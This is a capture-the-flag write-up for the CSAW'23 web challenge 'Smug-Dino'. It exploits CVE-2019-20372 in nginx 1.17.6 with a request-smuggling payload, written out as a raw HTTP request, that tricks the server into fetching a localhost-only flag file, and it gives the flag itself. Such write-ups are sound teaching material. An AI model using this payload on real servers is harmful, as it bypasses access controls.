# CSAW'23

## Smug-Dino

> 
> Don't you know it's wrong to smuggle dinosaurs... and other things?
>
>  Author: rollingcoconut
>

Tags: _web_

## Solution
For this challenge we get a small web application. There's not much to do. In the menu bar there is a `Flag` entry. After clicking we are forwarded to `http://localhost:3009/flag.txt`, not very helpful.

Another option in the menu bar is `Hint`. After clicking this we are requested to give some information to get the hint. The information required are `Server name` and `Server Version`. This can be looked up in the response header.

```bash
Server: nginx/1.17.6
```

Entering this information gives us some good hints.

```bash

HINT: #1

We believe the item you seek is only accessible to localhost clients on the server; 
All other requests to /flag will be processed as a 401. 


It seems the server is issuing 302 redirections to handle 401 erors...
Is it possible to use the redirection somehow to get the localhost flag?



HINT: #2

CVE 2019-....

```

A quick google search for `CVE 2019 nginx 1.17.6` gives us this interesting vulnerability [`CVE-2019-20372`](https://nvd.nist.gov/vuln/detail/cve-2019-20372). Request smuggling it is, that also fits the challenge title.

Next is to capture the `/flag` call with `Burp`, forward to `repeater` and add the smuggling payload.

```bash
GET /flag HTTP/1.1
Host: web.csaw.io:3009
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web.csaw.io:3009/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AqujNyjZZvcMzGaukbHN-PwDKY-cQuMit.aCujuaFvpR9WYhNeMvHgg1IyFZH3cSkEG4Vq%2BD2Nl0w
Connection: keep-alive

GET /flag.txt HTTP/1.1
Host: localhost
```

After sending the requests we get the flag.

Flag `csawctf{d0nt_smuggl3_Fla6s_!}`